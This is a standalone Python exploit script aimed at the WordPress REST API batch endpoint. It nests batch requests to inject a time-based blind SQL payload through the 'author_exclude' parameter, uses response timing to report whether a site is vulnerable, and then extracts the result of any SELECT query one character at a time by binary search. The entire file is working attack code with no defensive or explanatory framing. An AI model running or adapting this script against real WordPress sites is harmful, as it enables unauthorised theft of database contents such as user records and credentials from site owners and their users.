#!/usr/bin/env python3
import json
import statistics
import sys
import time
import urllib.parse
import urllib.request

if len(sys.argv) not in (2, 3):
	raise SystemExit(f'usage: {sys.argv[0]} BASE_URL ["SELECT ..."]')
url = sys.argv[1].rstrip("/") + "/?rest_route=/batch/v1"

def probe(condition):
	request = urllib.request.Request(
		url,
		data=json.dumps(
			{
				"requests": [
					{"method": "POST", "path": "http://:"},
					{
						"method": "POST",
						"path": "/wp/v2/posts",
						"body": {
							"requests": [
								{"method": "GET", "path": "http://:"},
								{
									"method": "GET",
									"path": "/wp/v2/categories?"
									+ urllib.parse.urlencode(
										{
											"author_exclude": "SELECT IF(("
											+ condition
											+ "),SLEEP(0.15),0)"
										}
									),
								},
								{"method": "GET", "path": "/wp/v2/posts"},
							]
						},
					},
					{"method": "POST", "path": "/batch/v1"},
				]
			}
		).encode(),
		headers={"Content-Type": "application/json"},
		method="POST",
	)
	started = time.perf_counter()
	with urllib.request.urlopen(request, timeout=10) as response:
		response.read()
	return time.perf_counter() - started


fast = statistics.median(probe("1=0") for _ in range(3))
slow = statistics.median(probe("1=1") for _ in range(3))
cutoff = (fast + slow) / 2
if slow - fast < 0.1:
	raise SystemExit(f"[-] instance not vulnerable fastest: {fast:.3f}s \nslow: {slow:.3f}s")
if len(sys.argv) == 2:
	print(f"[+] instance vulnerable fastest: {fast:.3f}s \nslow: {slow:.3f}s")
	raise SystemExit(0)
def yes(condition):
	return probe(condition) > cutoff
value = "COALESCE((" + sys.argv[2] + "),'')"
low, high = 0, 64



while low < high:
	middle = (low + high + 1) // 2
	if yes("CHAR_LENGTH(" + value + ") >= " + str(middle)):
		low = middle
	else:
		high = middle - 1

result = ""
for position in range(1, low + 1):
	minimum, maximum = 32, 126
	while minimum < maximum:
		middle = (minimum + maximum + 1) // 2
		if yes(
			"ASCII(SUBSTRING("
			+ value
			+ ","
			+ str(position)
			+ ",1)) >= "
			+ str(middle)
		):
			minimum = middle
		else:
			maximum = middle - 1
	result += chr(minimum)
	print(result, flush=True)
